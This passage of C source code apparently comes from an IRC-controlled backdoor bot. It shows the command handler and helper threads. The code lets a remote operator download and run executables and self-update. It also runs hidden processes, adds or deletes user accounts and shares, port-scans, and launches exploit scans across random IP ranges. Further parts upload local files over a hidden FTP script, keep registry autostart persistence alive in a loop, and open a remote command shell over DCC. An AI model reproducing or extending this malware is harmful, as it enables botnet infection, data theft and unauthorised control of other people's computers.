								if (ListServices(sock, a[2], notice))
									sprintf(sendbuf, "%s Service list complete.",mn_title);
								else
									sprintf(sendbuf, "%s Service list failed",mn_title);
							}
						else if (strcmp("stop", a[s+1]) == 0)
							sprintf(sendbuf, "%s", Services(NET_STOP, y));
						else if (strcmp("pause", a[s+1]) == 0)
							sprintf(sendbuf, "%s", Services(NET_PAUSE, y));
						else if (strcmp("continue", a[s+1]) == 0)
							sprintf(sendbuf, "%s", Services(NET_CONTINUE, y));
						else if (strcmp("delete", a[s+1]) == 0)
							sprintf(sendbuf, "%s", Services(NET_DELETE, y));
						else if (strcmp("share", a[s+1]) == 0) {
							if (a[s+2]) {
								if (parameters['d'])
									sprintf(sendbuf, "%s", Shares(NET_DELETE, a[s+2]));
								else
									sprintf(sendbuf, "%s", Shares(NET_ADD, a[s+2], a[s+3]));
							} else {
								if (ListShares(sock, a[2], notice))
									sprintf(sendbuf, "%s Share list completed",mn_title);
								else
									sprintf(sendbuf, "%s Share list failed",mn_title);
							}
						}
						else if (strcmp("user", a[s+1]) == 0) {
							if (a[s+2]) {
								if (parameters['d'])
									sprintf(sendbuf, "%s", Users(NET_DELETE, a[s+2], NULL, sock, a[2], notice));
								else {
									if (a[s+3])
										sprintf(sendbuf, "%s", Users(NET_ADD, a[s+2], a[s+3], sock, a[2], notice));
									else
										sprintf(sendbuf, "%s", Users(NET_INFO, a[s+2], NULL, sock, a[2], notice));
								}
							} else {
								if (ListUsers(sock, a[2], notice))
									sprintf(sendbuf, "%s User list completed",mn_title);
								else
									sprintf(sendbuf, "%s User list failed",mn_title);
							}
						}
						else if (strcmp("send", a[s+1]) == 0) {
							if (a[s+2])
								sprintf(sendbuf, "%s", NetSend(y, sock, a[2], notice));
							else
								sprintf(sendbuf, "%s No message specified",mn_title);
						}
						else
							sprintf(sendbuf,"%s Command unknown",mn_title);
					}
				} else
					sprintf(sendbuf, "%s Failed to load advapi32.dll or netapi32.dll",mn_title);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
			
				return repeat;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(gethost_cmd, a[s]) == 0) { 
				if(strstr(host, a[s+1])) {
					if (a[s+2]) {
						char *y = strstr(x, a[s+2]);
						if (y != NULL) {
							sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], y);
							strncpy(line,  sendbuf, (IRCLINE-1));
							sprintf(sendbuf,"%s Gethost: %s , Command: %s", mn_title,a[s+1],y);
							repeat++;
						} else
							sprintf(sendbuf,"%s Unable to extract Gethost command",mn_title);							
					} else {
						irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
						_snprintf(sendbuf,sizeof(sendbuf),"%s Gethost: %s", mn_title,a[s+1]);
					}
					addlog(sendbuf);
				}

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////
// 			       commands requiring at least 2 parameters          		    //
//////////////////////////////////////////////////////////////////////////////////

			else if (a[s+2] == NULL) return 1;
			else if (strcmp(addalias_cmd, a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						addalias(a[s+1], y);
						sprintf(sendbuf,"%s Alias added: %s", mn_title,a[s+1]);
						if(!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(privatemessage_cmd, a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						irc_privmsg(sock, a[s+1], y, FALSE);
						addlogv("Privmsg: %s: %s", a[s+1], y);
					}
				}

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(action_cmd, a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf, FALSE);
						addlogv("Action: %s: %.",a[s+1], y);
					}
				}

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(cycle_cmd, a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) 
					return 1;
				irc_sendv(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
				addlog("Cycle");

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(mode_cmd, a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "MODE %s\r\n", y);
						addlogv("Mode change: %s",y);
					}
				}

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(repeat_cmd, a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					if (strcmp(a[s+2]+1,"repeat") != 0) {
						sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
						strncpy(line,  sendbuf, (IRCLINE-1));
						sprintf(sendbuf,"%s Repeat: %s", mn_title,r);
						addlog(sendbuf);

						if (atoi(a[s+1]) > 0) 
							return repeat + atoi(a[s+1]); 
						else 
							return repeat;
					} else {
						sprintf(sendbuf,"%s Repeat not allowed in command line: %s", mn_title,r);
						if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						addlog(sendbuf);
					}
				}

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(delay_cmd, a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) 
						Sleep(atoi(a[s+1])*1000);
					addlog("Delay");
					return repeat + 1;
				}

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_DOWNLOAD
			else if (strcmp(update_cmd, a[s]) == 0) {
				if (strcmp(botid, a[s+2]) != 0) {
					char tempdir[MAX_PATH], tmpbuf[MAXNICKLEN];
					GetTempPath(sizeof(tempdir), tempdir);

					DOWNLOAD dl;
					strncpy(dl.url,  a[s+1], sizeof(dl.url)-1);
					sprintf(dl.dest, "%s%s.exe", tempdir, rndnickletter(tmpbuf));
					dl.update = 1;
					dl.run = 0;
					dl.expectedcrc=((a[s+3])?(strtoul(a[s+3],0,16)):(0));
					dl.filelen=((a[s+4])?(atoi(a[s+4])):(0));
					dl.encrypted=(parameters['e']);

					dl.sock = sock;
					strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
					dl.notice=notice;
					dl.silent = silent;

					sprintf(sendbuf, "%s Downloading update from: %s", mn_title,a[s+1]);
					dl.threadnum = addthread(sendbuf, UPDATE_THREAD, sock);
					if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
						while(dl.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"%s Failed to start download thread, error %d", mn_title,GetLastError());
				} else
					sprintf(sendbuf,"%s ID must be different than current running process");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(execute_cmd, a[s]) == 0) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = STARTF_USESHOWWINDOW;
				sinfo.wShowWindow=SW_HIDE;
				if (atoi(a[s+1]) == 1) sinfo.wShowWindow=SW_SHOW;
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) 
						if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo))
							sprintf(sendbuf,"%s Couldn't execute file",mn_title);
						else
							sprintf(sendbuf,"%s Commands: %s",mn_title,y);
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
			else if (strcmp(rename_cmd, a[s]) == 0) {
				if (MoveFile(a[s+1],a[s+2]))
					_snprintf(sendbuf,sizeof(sendbuf),"%s Rename: '%s' to: '%s'", mn_title,a[s+1], a[s+2]);
				else 
					_snprintf(sendbuf,sizeof(sendbuf),PrintError(""));

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
//////////////////////////////////////////////////////////////////////////////////
// 			       commands requiring at least 3 parameters						//
//////////////////////////////////////////////////////////////////////////////////
			else if (a[s+3] == NULL) return 1;
#ifndef NO_DOWNLOAD
			else if (strcmp(download_cmd, a[s]) == 0) {
				DOWNLOAD dl;
				strncpy(dl.url, a[s+1], sizeof(dl.url)-1);
				strncpy(dl.dest, a[s+2], sizeof(dl.dest)-1);
				dl.update = 0;
				dl.run = ((a[s+3])?(atoi(a[s+3])):(0));
				dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
				dl.filelen=((a[s+5])?(atoi(a[s+5])):(0));
				dl.encrypted=(parameters['e']);

				dl.sock = sock;
				strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
				dl.notice=notice;
				dl.silent = silent;

				sprintf(sendbuf, "%s Downloading URL: %s to: %s", mn_title,a[s+1], a[s+2]);
				dl.threadnum = addthread(sendbuf, DOWNLOAD_THREAD, sock);
				if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
					while(dl.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"%s Failed to start transfer thread, error %d", mn_title,GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
				
				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_SCAN
			else if (strcmp(portscan_cmd, a[s]) == 0) {
				SCAN scan;
				scan.addy.S_un.S_addr = finet_addr(a[s+1]);
				scan.port = atoi(a[s+2]);
				scan.delay = atoi(a[s+3]);
				scan.sock = sock;
				strncpy(scan.chan,  a[2], sizeof(scan.chan)-1);
				scan.notice = notice;
				scan.silent = silent;

				sprintf(sendbuf, "%s  Started: %s:%d with delay: %d(ms)", sc_title, finet_ntoa(scan.addy), scan.port, scan.delay);
				scan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
				if (threads[scan.threadnum].tHandle = CreateThread(NULL, 0, &ScanThread, (LPVOID)&scan, 0, &id)) {
					while(scan.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"%s Failed to start, thread, error %d", sc_title, GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
#endif 
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_ADVSCAN
			else if (strcmp(allscan_cmd, a[s]) == 0) {
				if (!a[s+1] || !a[s+2] || !a[s+3]) {
					sprintf(sendbuf, "%s Failed to start, syntax is invalid",sc_title);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					return 1;
				}
				for(int i=0; allscan[i].isend != false; i++) { }
				for(int sne=0; allscan[sne].isend != false; sne++) {
					int scanthreads=findthreadid(SCAN_THREAD);
					if (scanthreads + 400/i > MAXSCANTHRD) {
						sprintf(sendbuf ,"%s Already %d threads. Too many specified.", sc_title,scanthreads);
						irc_privmsg(sock,a[2],sendbuf,notice);
					} else {
						ADVSCAN advscan;
						advscan.threads = atoi(a[s+1]);
						advscan.delay = atoi(a[s+2]);
						advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
						advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
						advscan.minutes = atoi(a[s+3]);
						advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
						advscan.exploit = -1;

						for(i=0;exploit[i].port != 0;i++) {
							if (strcmp(exploit[i].command, allscan[sne].command) == 0) {
								advscan.port = exploit[i].port;
								advscan.exploit = i;

								break;
							}
						}

						if (advscan.port == 0) {
							sprintf(sendbuf, "%s Failed to start, syntax is invalid",sc_title);
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);

							return 1;
						}
						if (a[s+4] && a[s+4][0] != '#') {
							_snprintf(advscan.ip,sizeof(advscan.ip),a[s+4]);
							advscan.random = ((strchr(a[s+4],'x'))?(TRUE):(FALSE));
						} else {
							if (parameters['a'] || parameters['b'] || parameters['r']) {
								SOCKADDR_IN ssin;
								int ssin_len=sizeof(ssin);
								fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
								ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
								strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));
								
								if (parameters['r']) {
									int extractip = ((parameters['a']) ? 3 : 2);
									for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
							
									advscan.random = TRUE;
								} else
									advscan.random = FALSE;
							} else {
								sprintf(sendbuf, "%s Failed to start, no range specified",sc_title);
								if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
								addlog(sendbuf);
							
								return 1;
							}
						}
						advscan.sock = sock;
						advscan.notice = notice;
						advscan.silent = silent;
						_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
						if (a[s+5])
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+5]);
						else if (a[s+4] && a[s+4][0] == '#')
							_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+4]);
						else if (strcmp(exploitchan,"") != 0)
							_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
						else
							advscan.msgchan[0] = '\0';

						sprintf(sendbuf, "%s %s Method started at %s :%s for %d minutes %d delay %d threads", 
							sc_title, ((advscan.random)?("Random"):("Sequential")), advscan.ip, exploit[i].name, advscan.minutes, advscan.delay, advscan.threads);
						advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
						if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
							while(advscan.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"%s Failed to start thread, error: %d", sc_title, GetLastError());
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}
				return 1;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////
// 			       commands requiring at least 4 parameters						//
//////////////////////////////////////////////////////////////////////////////////
			else if (a[s+4] == NULL) return 1;
#ifndef NO_ADVSCAN
			else if (strcmp(advscan_cmd, a[s]) == 0) {
				int scanthreads=findthreadid(SCAN_THREAD);
				if (scanthreads + atoi(a[s+2]) > MAXSCANTHRD) {
					sprintf(sendbuf ,"%s already %d threads. too many specified", sc_title,scanthreads);
					irc_privmsg(sock,a[2],sendbuf,notice);
				} else {
					ADVSCAN advscan;
					advscan.port = atoi(a[s+1]); 
					advscan.threads = atoi(a[s+2]);
					advscan.delay = atoi(a[s+3]);
					advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
					advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
					advscan.minutes = atoi(a[s+4]);
					advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
					advscan.exploit = -1;

					for(i=0;exploit[i].port != 0;i++) {
						if (strcmp(exploit[i].command, a[s+1]) == 0) {
							advscan.port = exploit[i].port;
							advscan.exploit = i;

							break;
						}
					}

					if (advscan.port == 0) {
						sprintf(sendbuf, "%s failed to start, syntax is invalid",sc_title);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);

						return 1;
					}

					if (a[s+5] && a[s+5][0] != '#') {
						_snprintf(advscan.ip,sizeof(advscan.ip),a[s+5]);
						advscan.random = ((strchr(a[s+5],'x'))?(TRUE):(FALSE));
					} else {
						if (parameters['a'] || parameters['b'] || parameters['r']) {
							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
							ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
							strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

							if (parameters['r']) {
								int extractip = ((parameters['a']) ? 3 : 2);
								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
							
								advscan.random = TRUE;
							} else
								advscan.random = FALSE;
						} else {
							sprintf(sendbuf, "%s failed to start, no range specified",sc_title);
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);
							
							return 1;
						}
					}

					advscan.sock = sock;
					advscan.notice = notice;
					advscan.silent = silent;
					_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
					if (a[s+6])
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+6]);
					else if (a[s+5] && a[s+5][0] == '#')
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+5]);
					else if (strcmp(exploitchan,"") != 0)
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
					else
						advscan.msgchan[0] = '\0';

						sprintf(sendbuf, "%s %s Method started at %s :%s for %d minutes %d delay %d threads", 
							sc_title, ((advscan.random)?("Random"):("Sequential")), advscan.ip, exploit[i].name, advscan.minutes, advscan.delay, advscan.threads);
						advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
					if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
						while(advscan.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"%s Failed to start thread, error: %d", sc_title,GetLastError());

					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);

					return 1;
				}
			}
#endif
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_HTTP
			else if (strcmp(httpcon_cmd, a[s]) == 0) { 
				HTTP_Connect(sock,a[2],notice,silent,a[s+1],atoi(a[s+2]),a[s+3],a[s+4],a[s+5]);

				return repeat;
			}
#endif
//////////////////////////////////////////////////////////////////////////////////
// 			        commands requiring at least 5 parameters					//	
//////////////////////////////////////////////////////////////////////////////////
 
		    else if (a[s+5] == NULL) return 1; 
			else if (strcmp(upload_cmd, a[s]) == 0) { 
				if (!FileExists(a[s+5])) { 
					sprintf(sendbuf,"%s File not found: %s", mn_title,a[s+5]);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
					return 1; 
				} 
				char tmpftp[MAX_PATH],tmpsys[MAX_PATH]; 

				srand(GetTickCount());
				sprintf(tmpftp,"%s\\%i%i%i.dll",tmpsys,rand()%999,rand()%99,rand()%9); 

				FILE * fp = fopen(tmpftp,"ab"); 
				if (fp != NULL) { 
					fprintf(fp, "open %s\r\n%s\r\n%s\r\n%s\r\nput %s\r\nbye\r\n",
						a[s+1],a[s+2],a[s+3],a[s+4],a[s+5]); 
					fclose(fp); 

					char cmdline[256]; 
					sprintf(cmdline,"-s:%s",tmpftp); 
					if (fShellExecute(0, "open", "ftp.exe", cmdline, NULL, SW_HIDE))
						sprintf("%s Uploading file: %s  to: %s",mn_title,a[s+5],a[s+1]);
					else
						sprintf("%s Uploading file: %s  to: %s failed",mn_title,a[s+5],a[s+1]);

					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice); 
					addlog(sendbuf);
		
					while (FileExists(tmpftp)) 
						remove(tmpftp); 
				}

				return 1;
			}
		}
	}

	return repeat;
}
//////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////
#ifndef NO_REGISTRY
int registry_delay=60000;
#endif

AUTOSTART autostart[]={
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey1},
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey2},
	{HKEY_CURRENT_USER,(LPCTSTR)regkey4}
};

void AutoStartRegs(char *nfilename)
{
	HKEY key;

	for (int i=0; i < (sizeof(autostart) / sizeof(AUTOSTART)); i++) {
		fRegCreateKeyEx(autostart[i].hkey, autostart[i].subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		if (nfilename)
			fRegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)nfilename, strlen(nfilename));
		else
			fRegDeleteValue(key, valuename); 
		fRegCloseKey(key); 
	}
   
	return;
}

#ifndef NO_REGISTRY
DWORD WINAPI AutoRegistry(LPVOID param)
{
	char *nfilename = (char *)param;

	while (1) {
		AutoStartRegs(nfilename);
		Sleep(registry_delay);
	}
	return 0;
}
#endif

#ifndef NO_DCC

SOCKET CreateSock(char *host, int port)
{
	SOCKET ssock;
	if ((ssock = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return INVALID_SOCKET;

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)port);

	IN_ADDR in;
	in.s_addr = finet_addr(host);
	LPHOSTENT Hostent = NULL;
	if (in.s_addr == INADDR_NONE)
		Hostent = fgethostbyname(host); //hostname
	if (Hostent == NULL && in.s_addr == INADDR_NONE)  //error dns
		return INVALID_SOCKET;
	if (Hostent != NULL)
		ssin.sin_addr = *((LPIN_ADDR)*Hostent->h_addr_list); //hostname
	else
		ssin.sin_addr = in; //ip address

	if (fconnect(ssock, (LPSOCKADDR) &ssin, sizeof(ssin)) == SOCKET_ERROR) {
		fclosesocket(ssock);
		return INVALID_SOCKET;
	}

	return (ssock);
}

DWORD WINAPI DCCChatThread(LPVOID param)
{
	DCC dcc = *((DCC *)param);
	DCC *dccs = (DCC *)param;
	dccs->gotinfo = TRUE;

	char buffer[4096];

	SOCKET ssock;
	if ((ssock = CreateSock(dcc.host,dcc.port)) == INVALID_SOCKET) { 
		sprintf(buffer,"%s Failed to open socket",mn_title);
		if (!dcc.silent) irc_privmsg(ssock, dcc.sendto, buffer, dcc.notice);
		addlog(buffer);

		clearthread(dcc.threadnum);

		ExitThread(1);
	}
	if (open_cmd(ssock,"") == -1) {
		sprintf(buffer,"%s Failed to open remote command shell",mn_title);
		if (!dcc.silent) irc_privmsg(ssock, dcc.sendto, buffer, dcc.notice);
		addlog(buffer);

		fclosesocket(ssock);
		clearthread(dcc.threadnum);

		ExitThread(1);
	}
	Sleep(100);

	while (1) {
		memset(buffer, 0, sizeof(buffer));
		if (frecv(ssock, buffer, sizeof(buffer), 0) <= 0) 
			break;

		strcat(buffer,"\n");
		if (!send_commands(buffer))
			break;

		Sleep(100);
		if (findthreadid(RCMD_THREAD) == 0)
			break;
	}
	sprintf(buffer,"%s Failed to send to Remote command shell",mn_title);
	if (!dcc.silent) irc_privmsg(ssock, dcc.sendto, buffer, dcc.notice);
	addlog(buffer);
	
	fclosesocket(ssock);
	clearthread(dcc.threadnum);
	
	ExitThread(0);
}


DWORD WINAPI DCCSendThread(LPVOID param)
{
	DCC dcc = *((DCC *)param);
	DCC *dccs = (DCC *)param;
	dccs->gotinfo = TRUE;

	char sendbuf[IRCLINE],buffer[1024],tmpfile[MAX_PATH];

	int Fsend, bytes_sent;
	unsigned int move;
	unsigned __int64 totalbytes = 0;

	DWORD mode = 0;

	SOCKET ssock;
	while (1) {
		if ((ssock = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
      		sprintf(sendbuf,"%s Failed to create socket",mn_title);
			break;
		}

		SOCKADDR_IN csin, ssin;
		memset(&ssin, 0, sizeof(ssin));
   		ssin.sin_family = AF_INET;
   		ssin.sin_port = fhtons(0);//random port
		ssin.sin_addr.s_addr = INADDR_ANY;
		
		if (fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) != 0) {
			sprintf(sendbuf,"%s Failed to bind to socket",mn_title);
			break;
		}
		int ssin_len = sizeof(ssin);
		fgetsockname(ssock, (LPSOCKADDR)&ssin, &ssin_len);

		unsigned short portnum = fntohs(ssin.sin_port);
		for (unsigned int i=0;i <= strlen(dcc.filename); i++)
			tmpfile[i] = ((dcc.filename[i] == 32)?(95):(dcc.filename[i]));

		if (flisten(ssock, 1) != 0) {
			sprintf(sendbuf,"%s Failed to open socket",mn_title);
			break;
		}
		HANDLE testfile = CreateFile(dcc.filename,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
		if (testfile == INVALID_HANDLE_VALUE) {
			sprintf(sendbuf,"%s File doesn't exist",mn_title);
			break;
		}

		int length = GetFileSize(testfile,NULL);
		sprintf(sendbuf,".DCC SEND %s %i %i %i.",dcc.filename,fhtonl(finet_addr(GetIP(dcc.sock))),portnum,length);
		irc_privmsg(dcc.sock,dcc.sendto,sendbuf,FALSE);

		TIMEVAL timeout;
    	timeout.tv_sec = 60;//timeout after 60 sec.
    	timeout.tv_usec = 0;
		fd_set fd_struct;
		FD_ZERO(&fd_struct);
    	FD_SET(ssock, &fd_struct);

		if (fselect(0, &fd_struct, NULL, NULL, &timeout) <= 0) {
			irc_privmsg(dcc.sock,dcc.sendto,"Send timeout.",dcc.notice);
			break;
		}
		int csin_len = sizeof(csin);
		if ((dcc.csock = faccept(ssock, (LPSOCKADDR)&csin, &csin_len)) == INVALID_SOCKET)  {
			sprintf(sendbuf,"%s Unable to open socket",mn_title);
			break;
		} 
		fclosesocket(ssock);

		while (length) {
			Fsend = 1024;
			if (Fsend>length) 
				Fsend=length;
			move = 0-length;

			memset(buffer,0,sizeof(buffer));
			SetFilePointer(testfile, move, NULL, FILE_END);
			ReadFile(testfile, buffer, Fsend, &mode, NULL);

			bytes_sent = fsend(dcc.csock, buffer, Fsend, 0);
			totalbytes += bytes_sent;

			if (frecv(dcc.csock,buffer ,sizeof(buffer), 0) < 1 || bytes_sent < 1) {
				irc_privmsg(dcc.sock,dcc.sendto,"Socket error",dcc.notice);
				addlog("Socket error");

				fclosesocket(dcc.csock);
				clearthread(dcc.threadnum);

				ExitThread(1);
			}
			length = length - bytes_sent;
		}
		if (testfile != INVALID_HANDLE_VALUE) 
			CloseHandle(testfile);
		sprintf(sendbuf,"%s Transfer complete to IP: %s  Filename: %s (%s bytes)",mn_title,finet_ntoa(csin.sin_addr),dcc.filename,commaI64(totalbytes));
		break;
	}
	if (!dcc.silent) irc_privmsg(dcc.sock,dcc.sendto,sendbuf,dcc.notice);
	addlog(sendbuf);

	if (ssock > 0)
		fclosesocket(ssock);
	fclosesocket(dcc.csock);
	clearthread(dcc.threadnum);

	ExitThread(0);
}

DWORD WINAPI DCCGetThread(LPVOID param)
{
	DCC dcc = *((DCC *)param);
	DCC *dccs = (DCC *)param;
	dccs->gotinfo = TRUE;

	char sendbuf[IRCLINE],buffer[4096],tmpfile[MAX_PATH];;

	int received = 0;
	unsigned long received2;

	FILE *infile;
	
	SOCKET ssock;

	GetSystemDirectory(tmpfile, sizeof(tmpfile));
	sprintf(tmpfile,"%s%s",tmpfile,dcc.filename);

	while (1) {
		HANDLE testfile = CreateFile(tmpfile,GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
		if (testfile == INVALID_HANDLE_VALUE) {
			sprintf(sendbuf,"%s Error unable to write file to disk",mn_title);
			break;
		}
		CloseHandle(testfile);

		if ((infile = fopen(tmpfile,"a+b")) == NULL) {
			sprintf(sendbuf,"%s Error opening file for writing",mn_title);
			break;
		}
	
		if ((ssock = CreateSock(dcc.host,dcc.port)) == INVALID_SOCKET) {
			sprintf(sendbuf,"%s Error opening socket",mn_title);
			break;
		}
		DWORD err = 1;
		while (err != 0) {
			memset(buffer,0,sizeof(buffer));

			err = frecv(ssock, buffer, sizeof(buffer), 0);
			if (err == 0) 
				break;
			if (err == SOCKET_ERROR) {
				sprintf(sendbuf,"%s Socket error",mn_title);
				irc_privmsg(dcc.sock,dcc.sendto,sendbuf,dcc.notice);
				addlog(sendbuf);

				fclose(infile);
				fclosesocket(ssock);
				clearthread(dcc.threadnum);

				ExitThread(1);
			}
	
			fwrite(buffer,1,err,infile);
			received = received + err;
			received2 =  fhtonl(received);
			fsend(ssock,(char *)&received2 , 4, 0);
		}
		sprintf(sendbuf,"%s Transfer complete from IP: %s Filename: %s (%s bytes)",mn_title,dcc.host,dcc.filename,commaI64(received));
		break;
	}
	if (!dcc.silent) irc_privmsg(dcc.sock,dcc.sendto,sendbuf,dcc.notice);
	addlog(sendbuf);

	if (infile != NULL) 
		fclose(infile);
	if (ssock > 0) 
		fclosesocket(ssock);
	clearthread(dcc.threadnum);
	
	ExitThread(0);
}
#endif

// globals
#ifdef DEBUG_LOGGING
